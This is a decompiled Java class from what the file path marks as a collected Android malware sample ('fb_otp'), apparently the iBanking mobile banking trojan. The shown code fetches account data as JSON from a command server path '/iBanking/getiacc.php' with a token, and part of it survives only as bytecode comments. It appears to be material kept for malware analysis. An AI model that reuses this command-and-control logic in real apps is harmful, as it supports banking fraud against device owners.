import android.content.res.Resources;
import android.os.AsyncTask;
import android.view.View;
import android.widget.TextView;
import com.soft360.iService.AService;
import com.soft360.iService.MainActivity;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import org.json.JSONException;
import org.json.JSONObject;

public final class dF
  extends AsyncTask
{
  int jdField_a_of_type_Int = 11;
  TextView jdField_a_of_type_AndroidWidgetTextView;
  String jdField_a_of_type_JavaLangString = "";
  int jdField_b_of_type_Int = 12;
  String jdField_b_of_type_JavaLangString = "";
  public String c = "";
  
  private dF(MainActivity paramMainActivity) {}
  
  private Integer a()
  {
    try
    {
      TimeUnit.SECONDS.sleep(1L);
      localObject = this.jdField_a_of_type_ComSoft360IServiceMainActivity.jdField_a_of_type_DU.a(AService.jdField_a_of_type_Int) + "/iBanking/getiacc.php?token=" + this.c;
      new StringBuilder().append((String)localObject).toString();
    }
    catch (InterruptedException localInterruptedException)
    {
      for (;;)
      {
        try
        {
          Object localObject = new JSONObject(new String(a((String)localObject)));
          this.jdField_a_of_type_JavaLangString = ((JSONObject)localObject).getString("title");
          this.jdField_b_of_type_JavaLangString = ((JSONObject)localObject).getString("account");
          int i = this.jdField_a_of_type_Int;
          return Integer.valueOf(i);
        }
        catch (IOException localIOException)
        {
          localIOException.printStackTrace();
          return Integer.valueOf(this.jdField_b_of_type_Int);
        }
        catch (JSONException localJSONException)
        {
          localJSONException.printStackTrace();
          continue;
        }
        localInterruptedException = localInterruptedException;
        localInterruptedException.printStackTrace();
      }
    }
  }
  
  /* Error */
  private static byte[] a(String paramString)
  {
    // Byte code:
    //   0: new 115	java/net/URL
    //   3: dup
    //   4: aload_0
    //   5: invokespecial 116	java/net/URL:<init>	(Ljava/lang/String;)V
    //   8: invokevirtual 120	java/net/URL:openConnection	()Ljava/net/URLConnection;
    //   11: checkcast 122	java/net/HttpURLConnection
    //   14: astore_0
    //   15: aload_0
    //   16: sipush 5000
    //   19: invokevirtual 126	java/net/HttpURLConnection:setConnectTimeout	(I)V
    //   22: aload_0
    //   23: sipush 5000
    //   26: invokevirtual 129	java/net/HttpURLConnection:setReadTimeout	(I)V
    //   29: new 131	java/io/ByteArrayOutputStream
    //   32: dup
    //   33: invokespecial 132	java/io/ByteArrayOutputStream:<init>	()V
    //   36: astore_2
    //   37: aload_0
    //   38: invokevirtual 136	java/net/HttpURLConnection:getInputStream	()Ljava/io/InputStream;
    //   41: astore_3
    //   42: aload_0
    //   43: invokevirtual 140	java/net/HttpURLConnection:getResponseCode	()I
    //   46: istore_1
    //   47: iload_1
    //   48: sipush 200
    //   51: if_icmpeq +9 -> 60
    //   54: aload_0
    //   55: invokevirtual 143	java/net/HttpURLConnection:disconnect	()V
    //   58: aconst_null
    //   59: areturn
    //   60: sipush 1024
    //   63: newarray <illegal type>
    //   65: astore 4
    //   67: aload_3
    //   68: aload 4
    //   70: invokevirtual 149	java/io/InputStream:read	([B)I
    //   73: istore_1
    //   74: iload_1
    //   75: ifgt +18 -> 93
    //   78: aload_2
    //   79: invokevirtual 152	java/io/ByteArrayOutputStream:close	()V
    //   82: aload_2
    //   83: invokevirtual 156	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   86: astore_2
    //   87: aload_0
    //   88: invokevirtual 143	java/net/HttpURLConnection:disconnect	()V
    //   91: aload_2
    //   92: areturn
    //   93: aload_2
    //   94: aload 4
    //   96: iconst_0
    //   97: iload_1
    //   98: invokevirtual 160	java/io/ByteArrayOutputStream:write	([BII)V
    //   101: goto -34 -> 67
    //   104: astore_2
    //   105: aload_0
    //   106: invokevirtual 143	java/net/HttpURLConnection:disconnect	()V
    //   109: aload_2
    //   110: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	111	0	paramString	String
    //   46	52	1	i	int
    //   36	58	2	localObject1	Object
    //   104	6	2	localObject2	Object
    //   41	27	3	localInputStream	java.io.InputStream
    //   65	30	4	arrayOfByte	byte[]
    // Exception table:
    //   from	to	target	type
    //   29	47	104	finally
    //   60	67	104	finally
    //   67	74	104	finally
    //   78	87	104	finally
    //   93	101	104	finally
  }
  
  protected final void onPreExecute()
  {
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427449).setVisibility(4);
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427455).setVisibility(8);
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427452).setVisibility(8);
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427453).setVisibility(0);
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427454).setVisibility(8);
    this.jdField_a_of_type_AndroidWidgetTextView = ((TextView)this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427451));
    this.jdField_a_of_type_AndroidWidgetTextView.setText(this.jdField_a_of_type_ComSoft360IServiceMainActivity.getResources().getIdentifier("template" + this.jdField_a_of_type_ComSoft360IServiceMainActivity.getString(2131165185) + "_please_wait", "string", this.jdField_a_of_type_ComSoft360IServiceMainActivity.getPackageName()));
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dF.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */